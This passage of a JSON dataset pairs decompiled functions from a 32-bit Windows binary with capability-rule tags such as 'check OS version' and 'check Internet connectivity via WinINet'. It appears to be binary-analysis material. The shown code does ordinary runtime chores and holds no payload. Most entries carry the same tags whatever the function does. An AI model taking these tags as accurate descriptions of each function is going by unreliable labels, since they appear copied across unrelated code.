'\\0') goto code_r0x0040ce5f;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040bc44();\n                    }\n                }\n                else {\n                    fcn.0040cb04(&stack0xfffffffc);\n                }\n            }\n            fcn.0040c9e0();\n            fcn.0040c850();\n            if ((*0x4a88d4 != '\\0') && (iVar2 = fcn.00405a48(),  iVar2 != 0)) {\n                if (**0x4a8828 - 0x30U < 10) {\n                    fcn.0040ca68();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.0040572c(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040c850();\n                        iVar2 = fcn.0040572c();\n                        if (iVar2 < *param_2) break;\n                        fcn.0040572c();\n                        fcn.00405964();\n                        iVar2 = fcn.00409a14();\n                        if (iVar2 == 0) break;\n                        fcn.0040572c();\n                        fcn.00405964();\n                        iVar2 = fcn.00409a14();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040b894(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040ce5f:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405490(0x40ce89);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1314
    },
    "0040ceac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040ceac(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040c908();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040c908(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040c908();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040c908(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040c850();\n    }\n    cVar1 = fcn.0040c874(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40cf5e;\n        cVar1 = fcn.0040c9e0();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040c874(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xcf8c;\n            cVar1 = fcn.0040c9e0();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040c874(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40cfba;\n                cVar1 = fcn.0040c9e0();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040c874(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040c908();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040c908(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040c908();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040c908(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040c850();\n            uVar2 = fcn.0040b74c(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 824
    },
    "0040d2a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2a8(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040d230(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00407480();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040d408": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d408(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4a88d4) == 0) {\n            fcn.00405664();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "0040d930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040d930(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40d944;\n    fcn.0040d7a8(0x400);\n    if (**0x4a4ff4 == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x4a4c94 + 4);\n        puStack1112 = 0x40d9c6;\n        puStack1112 = fcn.00406940();\n        uStack1116 = 0x40d9cc;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40d958;\n        fcn.00403810();\n        puStack1100 = 0x40d95d;\n        fcn.0040304c();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40d96c;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40d97c;\n        uStack1116 = fcn.0040a764();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40d989;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40d9f4, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 590
    },
    "0040de50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040de50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40e00b;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00407480();\n    }\n    else {\n        fcn.00407480();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.004056dc();\n            fcn.0040a588();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00407480();\n            fcn.0040da34(arg_8h_00, puVar4);\n            goto code_r0x0040dfda;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00407480();\n    fcn.0040da34(arg_8h_00, puVar4);\ncode_r0x0040dfda:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.0040546c(0x40e012);\n    fcn.00405490();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 857
    },
    "0040e178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e178(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x4a891c != NULL) {\n        *(*0x4a891c + 3) = 1;\n        (**(**0x4a891c + -8))();\n        *0x4a891c = NULL;\n    }\n    if (*0x4a8920 != 0) {\n        *(*0x4a8920 + 0xc) = 1;\n        fcn.00404640();\n        *0x4a8920 = 0;\n    }\n    **0x4a4bd8 = 0;\n    **0x4a4d48 = 0;\n    **0x4a4c70 = 0;\n    **0x4a4d24 = 0;\n    **0x4a4d54 = 0;\n    **0x4a4f2c = 0;\n    iVar1 = fcn.00402f74();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00402f94();\n        fcn.00402f74(uVar2);\n        fcn.0040e0e4();\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0040e38c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e38c(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x4a1830) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x4a1830) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x4a1830) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 368
    },
    "0040e400": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e400(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4a88d4 != '\\0') {\n        fcn.004058fc();\n        uVar1 = fcn.0040e38c();\n    }\n    return uVar1;\n}\n",
        "token_count": 73
    },
    "0040e424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e424(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4a88d4 != '\\0') {\n        uVar1 = fcn.0040e38c();\n    }\n    return uVar1;\n}\n",
        "token_count": 65
    },
    "0040e64c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e64c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4a88d4 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 77
    },
    "0040e674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e674(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4a88d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x4a1830) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004058fc();\n        uVar1 = fcn.0040e64c();\n    }\n    return uVar1;\n}\n",
        "token_count": 156
    },
    "0040e6ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e6ac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4a88d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x4a1830) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004058fc();\n        iVar1 = fcn.0040e64c();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 172
    },
    "0040e894": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e894(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.0040a764();\n        uVar2 = fcn.0040a764();\n        iVar4 = fcn.0040a950();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040e424();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040e92a;\n            }\n            iVar4 = fcn.0040a950();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040e92a:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 319
    },
    "0040eac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040eac8(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40ed93;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040eac8::var_18h;\n    var_1ch = 0x40eaeb;\n    var_ch = unaff_EBX;\n    fcn.0040ea04();\n    var_1ch = 0x40eaf0;\n    fcn.0040d2e4();\n    if (*0x4a88d4 != '\\0') {\n        var_1ch = 0x40eafe;\n        fcn.0040d4bc();\n    }\n    var_1ch = 0x40eb03;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040eac8::var_10h;\n    var_20h = 0x40eb17;\n    fcn.0040d230(var_1ch);\n    var_20h = 0x40eb24;\n    fcn.004054c0();\n    var_20h = &fcn.0040eac8::var_14h;\n    var_24h = 0x40eb39;\n    fcn.0040d230(var_20h);\n    var_24h = 0x40eb43;\n    *0x4a880c = fcn.00409e14();\n    var_24h = &fcn.0040eac8::var_18h;\n    var_28h = 0x40eb5d;\n    fcn.0040d230(var_24h);\n    var_28h = 0x40eb67;\n    *0x4a880d = fcn.00409e14();\n    var_28h = 0x40eb7a;\n    *0x4a880e = fcn.0040d27c();\n    var_28h = 0x40eb8d;\n    *0x4a880f = fcn.0040d27c();\n    var_28h = &fcn.0040eac8::var_1ch;\n    var_2ch = 0x40eba7;\n    fcn.0040d230(var_28h);\n    var_2ch = 0x40ebb1;\n    *0x4a8810 = fcn.00409e14();\n    var_2ch = 0x40ebc4;\n    *0x4a8811 = fcn.0040d27c();\n    var_2ch = &fcn.0040eac8::var_24h;\n    var_30h = 0x40ebde;\n    fcn.0040d230(var_2ch);\n    var_30h = 0x40ebe9;\n    fcn.0040d56c();\n    var_30h = 0x40ebf6;\n    fcn.004054c0();\n    var_30h = &fcn.0040eac8::var_2ch;\n    var_34h = 0x40ec0b;\n    fcn.0040d230(var_30h);\n    var_34h = 0x40ec16;\n    fcn.0040d56c();\n    var_34h = 0x40ec23;\n    fcn.004054c0();\n    var_34h = 0x40ec31;\n    *0x4a881c = fcn.0040d27c();\n    var_34h = &fcn.0040eac8::var_30h;\n    var_38h = 0x40ec4b;\n    fcn.0040d230(var_34h);\n    var_38h = 0x40ec58;\n    fcn.004054c0();\n    var_38h = &fcn.0040eac8::var_34h;\n    var_3ch = 0x40ec6d;\n    fcn.0040d230(var_38h);\n    var_3ch = 0x40ec7a;\n    fcn.004054c0();\n    var_3ch = 0x40ec82;\n    fcn.0040546c();\n    var_3ch = 0x40ec8a;\n    fcn.0040546c();\n    var_3ch = &fcn.0040eac8::var_38h;\n    var_40h = 0x40ec9f;\n    fcn.0040d230(var_3ch);\n    var_40h = 0x40eca9;\n    iVar1 = fcn.00409e14();\n    if (iVar1 == 0) {\n        var_40h = 0x40ecba;\n        fcn.00405504();\n    }\n    else {\n        var_40h = 0x40ecc9;\n        fcn.00405504();\n    }\n    var_40h = &fcn.0040eac8::var_3ch;\n    fcn.0040d230(var_40h);\n    iVar1 = fcn.00409e14();\n    if (iVar1 == 0) {\n        fcn.0040d230(&fcn.0040eac8::var_40h);\n        iVar1 = fcn.00409e14();\n        if (iVar1 == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n    }\n    fcn.00405800(var_ch, 0x40ee2c, var_4h, var_8h);\n    fcn.00405800(var_ch, 0x40ee38, var_4h, var_8h);\n    *0x4a88d6 = fcn.0040d27c();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405490(0x40ed9a);\n    return;\n}\n",
        "token_count": 1695
    },
    "0040eff0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040eff0(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    \n    uVar1 = 0;\n    while( true ) {\n        uVar2 = uVar1 << 5 | uVar1 >> 0x1b;\n        uVar3 = *in_EAX;\n        if (uVar3 == 0) break;\n        if (('@' < uVar3) && (uVar3 < '[')) {\n            uVar3 = uVar3 | 0x20;\n        }\n        uVar1 = uVar1 << 5 & 0xffffff00 | uVar2 ^ uVar3;\n        in_EAX = in_EAX + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 187
    },
    "0040f23c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f23c(void)\n\n{\n    while( true ) {\n        if (*0x4a1a28 == NULL) break;\n        *0x4a1a28 = **0x4a1a28;\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0040f2a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f2a0(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x4a4d28 == 0) {\n        iVar3 = 0;\n        for (puVar1 = **0x4a5074; puVar1 != NULL; puVar1 = *puVar1) {\n            sub.kernel32.dll_FindResourceA(puVar1[1], 0x40f310, 10);\n            iVar3 = sub.kernel32.dll_LoadResource();\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    else {\n        uVar2 = sub.kernel32.dll_FindResourceA(**0x4a4d28, 0x40f310, 10);\n        iVar3 = sub.kernel32.dll_LoadResource(**0x4a4d28, uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 212
    },
    "0040f318": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040f318(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x40f322;\n    iVar2 = fcn.0040f2a0(param_1);\n    iVar3 = *0x4a1a38;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040f260();\n        iVar4 = fcn.0040f270();\n        if ((((iVar3 == *0x4a1a2c) && (iVar4 == *0x4a1a3c)) || ((iVar3 == *0x4a1a30 && (iVar4 == *0x4a1a40)))) ||\n           ((iVar3 == *0x4a1a34 && (iVar4 == *0x4a1a44)))) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        sub.kernel32.dll_FreeResource(iVar2, param_1 & 0xffffff00 | uVar1);\n        iVar4 = iVar2;\n        if (iVar2 == '\\0') {\n            fcn.0040f288();\n            iVar4 = iVar2;\n        }\n    }\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 307
    },
    "0040f3a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f3a8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40f3e0);\n    if (iVar1 != 0) {\n        *0x4a1854 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40f3f0);\n    }\n    if (*0x4a1854 == NULL) {\n        *0x4a1854 = fcn.0040a644;\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0040f990": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f990(void)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = **0x4a5074; puVar1 != NULL; puVar1 = *puVar1) {\n        if (puVar1[5] != 0) {\n            fcn.0040635c();\n            puVar1[5] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "004102a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004102a8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00411b18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
